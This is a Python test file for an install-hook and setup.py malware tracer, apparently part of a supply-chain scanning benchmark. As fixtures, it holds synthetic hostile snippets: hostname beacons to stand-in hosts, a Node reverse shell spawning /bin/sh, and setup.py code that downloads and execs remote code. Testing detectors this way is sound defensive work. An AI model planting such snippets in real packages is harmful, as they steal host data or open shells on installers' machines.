"""Ruleset v2 (2026.11.10-v2): install-hook tracing (npm) and setup.py tracing (PyPI), the fresh-set tooling and the
runner's fresh-split guard. Synthetic code only; nothing is executed."""
from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path[:0] = [str(ROOT), str(ROOT / "benchmark")]

import install_trace as IT  # noqa: E402


def pkg(scripts: dict, files: dict, base: str = "tmp/tmpab12/pkg/package") -> dict:
    out = {f"{base}/package.json": json.dumps({"name": "x", "version": "1.0.0", "scripts": scripts})}
    out.update({f"{base}/{k}": v for k, v in files.items()})
    return out


def rules(res) -> set[str]:
    return {f["rule_id"] for f in res["findings"]}


# ------------------------------------------------------------------ npm hook parsing
@pytest.mark.parametrize("cmd,expected", [
    ("node index.js", [("file", "index.js")]),
    ("node ./lib/x.js", [("file", "./lib/x.js")]),
    ("node test.js > /dev/null 2>&1", [("file", "test.js")]),
    ("node -e \"require('./a')\"", [("inline", "require('./a')")]),
    ("sh scripts/t.sh preinstall", [("file", "scripts/t.sh")]),
    ("FOO=1 node --no-warnings run.js", [("file", "run.js")]),
    ("node-gyp rebuild", []),
    ("prebuild-install || node-gyp rebuild", []),
    ("node install.js && echo done", [("file", "install.js")]),
])
def test_parse_hook(cmd, expected):
    assert IT.parse_hook(cmd) == expected


# ------------------------------------------------------------------ npm rules
BEACON = "const os = require('os'); const https = require('https');\n" \
         "https.request({host: 'h.example', path: '/' + os.hostname()}).end();\n"


def test_n1_fingerprint_and_network_in_hook_target():
    res = IT.trace_npm_hooks(pkg({"preinstall": "node index.js"}, {"index.js": BEACON}))
    assert rules(res) == {"N1"} and all(f["strong"] for f in res["findings"])


def test_n1_followed_through_require_and_spawn_chain():
    files = {"postinstall.js": "const {spawn}=require('child_process'); spawn('node',['main.js']);",
             "main.js": "require('./lib/core/installer');",
             "lib/core/installer.js": BEACON}
    res = IT.trace_npm_hooks(pkg({"postinstall": "node postinstall.js"}, files))
    hit = [f for f in res["findings"] if f["rule_id"] == "N1"]
    assert hit and hit[0]["file"].endswith("lib/core/installer.js")
    assert hit[0]["trace"][0].endswith("postinstall.js")


def test_n2_oast_endpoint():
    res = IT.trace_npm_hooks(pkg({"install": "node a.js"}, {"a.js": "const u='http://abc.oast.fun/x';"}))
    assert "N2" in rules(res)


def test_n3_socket_and_shell():
    code = "const net=require('net');const {spawn}=require('child_process');const c=new net.Socket();" \
           "c.connect(1,'h',()=>{const sh=spawn('/bin/sh',['-i']);c.pipe(sh.stdin);});"
    assert "N3" in rules(IT.trace_npm_hooks(pkg({"postinstall": "node r.js"}, {"r.js": code})))


def test_n4_detached_is_review():
    code = "const {spawn}=require('child_process');const c=spawn('node',['x.js'],{detached: true,stdio:'ignore'});c.unref();"
    res = IT.trace_npm_hooks(pkg({"postinstall": "node p.js"}, {"p.js": code, "x.js": "console.log(1)"}))
    assert [(f["rule_id"], f["strong"]) for f in res["findings"]] == [("N4", False)]


def test_inline_node_e():
    res = IT.trace_npm_hooks(pkg({"preinstall": "node -e \"require('https').get('https://x.example/'+require('os').hostname())\""}, {}))
    assert "N1" in rules(res)


def test_native_installer_shapes_are_not_flagged():
    """esbuild / sharp / core-js-like install scripts: platform/arch/homedir, child_process, https downloads."""
    esbuild_like = ("const os=require('os');const https=require('https');const cp=require('child_process');"
                    "const key=`${process.platform} ${os.arch()}`;const cache=require('path').join(os.homedir(),'.cache');"
                    "https.get('https://registry.npmjs.org/@esbuild/linux-x64/-/linux-x64-0.1.0.tgz',r=>{});"
                    "cp.execFileSync(process.execPath,['--version']);")
    core_js_like = "var env=process.env;if(!env.CI&&!env.ADBLOCK){console.log('Thank you for using core-js');}"
    for scripts, files in (({"postinstall": "node install.js"}, {"install.js": esbuild_like}),
                           ({"postinstall": "node -e \"try{require('./postinstall')}catch(e){}\""},
                            {"postinstall.js": core_js_like}),
                           ({"install": "node install/check.js || npm run build"}, {"install/check.js": esbuild_like})):
        assert IT.trace_npm_hooks(pkg(scripts, files))["findings"] == []


def test_missing_target_is_recorded_not_flagged():
    res = IT.trace_npm_hooks(pkg({"postinstall": "node bundle.js"}, {}))
    assert res["findings"] == [] and res["hooks"][0]["missing"] == "bundle.js"


def test_node_modules_package_json_ignored():
    files = pkg({"preinstall": "node i.js"}, {"i.js": BEACON}, base="node_modules/dep")
    assert IT.trace_npm_hooks(files)["hooks"] == []


# ------------------------------------------------------------------ setup.py
def test_root_setup_detection_nested():
    text = {"tmp/t1/pkg/pkg-1.0/setup.py": "", "tmp/t1/pkg/pkg-1.0/sub/setup.py": ""}
    assert IT.root_setups(text) == ["tmp/t1/pkg/pkg-1.0/setup.py"]
    assert IT.root_setups({"setup.py": "", "a/b/setup.py": ""}) == ["setup.py"]
    assert IT.root_setups({"tests/x/setup.py": ""}) == []


def test_alias_resolution_and_code_string_p4():
    setup = ("from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _f\nfrom os import system as _s\n"
             "t=_f(delete=False)\nt.write(b\"\"\"from urllib.request import urlopen as _u;exec(_u('https://x.example/r').read())\"\"\")\n"
             "t.close()\n_s('start pythonw '+t.name)\nsetup(name='x')\n")
    res = IT.trace_setup_py({"a/b/x-1.0/setup.py": setup})
    assert "P4" in rules(res)


def test_local_import_followed_from_cmdclass():
    setup = ("from setuptools import setup\nfrom setuptools.command.install import install\n"
             "class I(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n"
             "setup(name='x', cmdclass={'install': I})\n")
    main = ("import platform, urllib.request\n"
            "def main():\n    urllib.request.urlopen('http://h.example/?h=' + platform.node())\n")
    res = IT.trace_setup_py({"t/x/x-1/setup.py": setup, "t/x/x-1/main.py": main})
    assert "P1" in rules(res)
    f = next(f for f in res["findings"] if f["rule_id"] == "P1")
    assert f["file"].endswith("main.py") and f["trace"][0].endswith("setup.py")


def test_version_import_not_followed():
    """`from pkg import __version__` (not called, top level) is not followed."""
    setup = "from setuptools import setup\nfrom mypkg import __version__\nsetup(name='mypkg', version=__version__)\n"
    init = "import socket, requests\n__version__='1.0'\ndef f():\n    requests.get('https://x.example/'+socket.gethostname())\n"
    res = IT.trace_setup_py({"setup.py": setup, "mypkg/__init__.py": init})
    assert res["findings"] == [] and res["traced"] == ["setup.py"]


def test_p1_in_setup_itself_dns_beacon():
    setup = ("import os, socket\nfrom setuptools import setup\n"
             "def cb():\n    socket.getaddrinfo(socket.gethostname() + '.' + os.getenv('USER') + '.h.example', 80)\n"
             "cb()\nsetup(name='x')\n")
    assert "P1" in rules(IT.trace_setup_py({"setup.py": setup}))


def test_git_describe_is_benign():
    setup = "import subprocess\nfrom setuptools import setup\nv=subprocess.check_output(['git','describe'])\nsetup(name='x')\n"
    assert IT.trace_setup_py({"setup.py": setup})["findings"] == []


def test_native_build_setup_review_only():
    setup = ("import subprocess as sp\nfrom setuptools import setup\nfrom setuptools.command.build_ext import build_ext\n"
             "class B(build_ext):\n    def run(self):\n        sp.check_call(['cmake', '..'])\n"
             "setup(name='x', cmdclass={'build_ext': B})\n")
    res = IT.trace_setup_py({"setup.py": setup})
    assert [(f["rule_id"], f["strong"]) for f in res["findings"]] == [("P5", False)]


# ------------------------------------------------------------------ detectors through the pipeline
def _scan(text: dict):
    import repo_scan
    data = {"sha": "", "py": {p: c.encode() for p, c in text.items() if p.endswith(".py")}, "text": dict(text),
            "workflows": {}, "binaries": [], "all_py_paths": {p for p in text if p.endswith(".py")},
            "skipped": {"tests": 0, "too_big_or_limit": 0}, "counts": {}}
    res = {"ran": False, "findings": [], "coverage": [], "strong": 0, "review": 0, "code_high": 0, "secrets_strong": 0,
           "ci_high": 0, "code_scan": "not_run", "malware_proof": None, "known_malicious_count": 0,
           "high_risk_pattern_count": 0, "timings": {}}
    scan = repo_scan.scan_data(res, data, "npm", "x", lambda f, ln: None, bandit_enabled=False,
                               identity={"repo": None, "package": {"ecosystem": "npm", "name": "x"}})
    return {d["detector"]: d for d in scan["detectors"]}


def test_install_hook_target_detector_high_risk():
    d = _scan(pkg({"preinstall": "node index.js"}, {"index.js": BEACON}))["install_hook_target"]
    assert d["status"] == "ran" and d["tier"] == "high_risk"
    assert d["findings"][0]["capability_evidence"] and d["findings"][0]["ruleset_version"] == "2026.11.10-v2"


def test_install_hook_target_not_applicable_without_hooks():
    d = _scan({"index.js": "module.exports = 1"})["install_hook_target"]
    assert d["status"] == "not_applicable"


def test_setup_py_hook_runs_on_nested_setup():
    setup = ("import platform, urllib.request\nfrom setuptools import setup\n"
             "urllib.request.urlopen('http://h.example/' + platform.node())\nsetup(name='x')\n")
    d = _scan({"tmp/t/x/x-1.0/setup.py": setup})["setup_py_hook"]
    assert d["status"] == "ran" and d["tier"] == "high_risk"


def test_setup_py_hook_still_not_applicable_without_setup():
    assert _scan({"a.py": "print(1)"})["setup_py_hook"]["status"] == "not_applicable"


# ------------------------------------------------------------------ fresh set tooling
def test_fresh_bucket_and_fingerprints():
    import fresh_set as FS
    files = pkg({"postinstall": "node i.js"}, {"i.js": BEACON * 3})
    assert FS.bucket(files, "npm") == "npm install hook"
    assert FS.bucket({"a/setup.py": ""}, "PyPI") == "PyPI setup.py"
    assert FS.bucket({"a/x.py": ""}, "PyPI") == "other"
    a = FS.fingerprints({"x.js": ("var pkg='alpha-tool'; var v='1.2.3';\n" * 10) + "fetch('https://abc.oast.fun/')"},
                        "alpha-tool", "1.2.3")
    b = FS.fingerprints({"y.js": ("var pkg='beta-tool'; var v='9.9.9';\n" * 10) + "fetch('https://abc.oast.fun/')"},
                        "beta-tool", "9.9.9")
    assert {k for k, _ in a} == {"file", "named", "host"}
    assert ({v for k, v in a if k == "named"} == {v for k, v in b if k == "named"})      # same campaign template
    assert ({v for k, v in a if k == "file"} != {v for k, v in b if k == "file"})
    assert ("host", "abc.oast.fun") in a
    assert not [h for k, h in FS.fingerprints({"z.js": "x" * 300 + " https://github.com/a/b"}, "z", "1") if k == "host"]


def test_fresh_dev76_ids():
    import fresh_set as FS
    ids = FS.dev76_ids()
    assert len(ids) == 76 and len(set(ids)) == 76


def test_fresh_selection_manifest_rules():
    import bench_items as B
    sel = B.read_manifest(B.MAN / "fresh" / "datadog_selection.csv")
    assert len(sel) == 300
    v1 = B.read_manifest(B.MAN / "datadog_extracted.csv")
    v1_paths = {r["sample_path"] for r in v1}
    v1_pkgs = {(r["ecosystem"], B.package_key(r["ecosystem"], r["package"])) for r in v1}
    assert not v1_paths & {r["sample_path"] for r in sel}
    assert not v1_pkgs & {(r["ecosystem"], B.package_key(r["ecosystem"], r["package"])) for r in sel}
    assert len({(r["ecosystem"], B.package_key(r["ecosystem"], r["package"])) for r in sel}) == 300
    assert len({r["git_blob"] for r in sel}) == 300


def test_fresh_known_good_excludes_v1():
    import bench_items as B
    fresh = B.read_manifest(B.MAN / "fresh" / "known_good.csv")
    old = {r["package"].lower() for f in ("known_good.csv", "known_good_dormant.csv", "known_good_scary.csv")
           for r in B.read_manifest(B.MAN / f)}
    assert len(fresh) == 120 and not old & {r["package"].lower() for r in fresh}


def test_fresh_items_have_split_fresh():
    import bench_items as B
    items, _moves = B.all_items()
    fresh = [i for i in items if i["split"] == "fresh"]
    assert fresh and all(i["category"] in ("known_good", "known_bad") for i in fresh)
    assert not any(i["split"] == "test" and i["id"].startswith("fresh_known_good:") for i in items)


# ------------------------------------------------------------------ runner guard
def test_fresh_guard_rejects_unfrozen_or_unregistered(monkeypatch):
    import run_benchmark as RB
    from detectors import version as V
    monkeypatch.setattr(V, "RULESET_VERSION", "2099.01.01-x")
    with pytest.raises(RB.GuardError):
        RB.check_fresh()


def test_ruleset_tag_check_detects_changes(monkeypatch):
    import run_benchmark as RB

    def fake_git(*args, data=None):
        if args[0] == "ls-tree":
            return "100644 blob aaaa\tdetectors/a.py\n100644 blob bbbb\tx.py\n100644 blob cccc\tbenchmark/r.py\n"
        if args[0] == "hash-object":
            return "aaaa\nbbbb\n" if not getattr(fake_git, "changed", False) else "aaaa\nzzzz\n"
        if args[0] == "ls-files":
            return "detectors/a.py\nx.py\nbenchmark/r.py\n" + ("extra.py\n" if getattr(fake_git, "extra", False) else "")
        if args[0] == "rev-list":
            return "c0ffee\n"
        raise AssertionError(args)
    monkeypatch.setattr(RB, "_git", fake_git)
    monkeypatch.setattr(RB, "ROOT", ROOT)
    monkeypatch.setattr(Path, "is_file", lambda self: True)
    rec = RB.verify_ruleset_tag("t")
    assert rec["verified"] and rec["files"] == 2
    fake_git.changed = True
    with pytest.raises(RB.GuardError):
        RB.verify_ruleset_tag("t")
    fake_git.changed, fake_git.extra = False, True
    with pytest.raises(RB.GuardError):
        RB.verify_ruleset_tag("t")


def test_inline_require_is_followed():
    res = IT.trace_npm_hooks(pkg({"postinstall": "node -e \"try{require('./postinstall')}catch(e){}\""},
                                 {"postinstall.js": BEACON}))
    assert "N1" in rules(res) and res["hooks"][0]["traced"][0].endswith("postinstall.js")


def _rec(i, cat, eco, tiers, ver, label="No findings", status="scored", dets=None):
    chk = {"tag": "t", "files": 1, "files_sha256": "ab" * 32, "verified": True}
    return {"id": i, "category": cat, "split": "fresh", "ecosystem": eco, "status": status, "label": label,
            "findings_by_tier": {"known_malicious": 0, "high_risk": tiers.count("h"), "review": tiers.count("r")},
            "detectors": dets or {}, "run": {"ruleset_version": ver, "split": "fresh", "osv": False,
                                             "fragility_escalation": False, "snapshot": "2026-11-10", "ruleset_check": chk}}


def test_results_v2_build():
    import results_v2 as R
    d_hr = {"install_hook_target": {"tier": "high_risk"}}
    v1 = {"b1": _rec("b1", "known_bad", "npm", "", "2026.11.08-12"), "b2": _rec("b2", "known_bad", "PyPI", "r", "2026.11.08-12"),
          "b3": _rec("b3", "known_bad", "PyPI", "", "2026.11.08-12"),
          "g1": _rec("g1", "known_good", "npm", "", "2026.11.08-12")}
    v2 = {"b1": _rec("b1", "known_bad", "npm", "h", "2026.11.10-v2", dets=d_hr),
          "b2": _rec("b2", "known_bad", "PyPI", "r", "2026.11.10-v2"),
          "b3": _rec("b3", "known_bad", "PyPI", "", "2026.11.10-v2", status="not_assessed"),
          "g1": _rec("g1", "known_good", "npm", "", "2026.11.10-v2")}
    facts = [{"id": "b1", "bucket": "npm install hook", "near_duplicate": "yes", "near_duplicate_rules": "host"},
             {"id": "b2", "bucket": "PyPI setup.py", "near_duplicate": "no", "near_duplicate_rules": ""},
             {"id": "b3", "bucket": "other", "near_duplicate": "no", "near_duplicate_rules": ""}]
    lines, t = R.build(v1, v2, facts)
    s = {(x["ruleset"], x["subset"], x["metric"]): x for x in t["summary"]}
    assert (s[("v2", "a", "recall_strict")]["k"], s[("v2", "a", "recall_strict")]["n"]) == (1, 2)
    assert (s[("v2", "b", "recall_strict")]["k"], s[("v2", "b", "recall_strict")]["n"]) == (0, 1)
    assert s[("v1", "a", "recall_strict")]["k"] == 0 and s[("v2", "all", "fp_hard")]["k"] == 0
    assert "Headline subset: **(b)**" in "\n".join(lines)          # 50 pp gap >= 3
    assert any(r["id"] == "b3" for r in t["not_scored"])
    with pytest.raises(SystemExit):
        R.build(v2, v2, facts)                                     # the v1 slot must hold a v1 run


def test_v1_tools_ignore_the_fresh_set():
    import bench_items as B
    items, _ = B.v1_items()
    assert not any(i.get("origin") == "fresh" or i["split"] == "fresh" for i in items)
    assert len(items) == len([i for i in B.all_items()[0] if i.get("origin") != "fresh"])
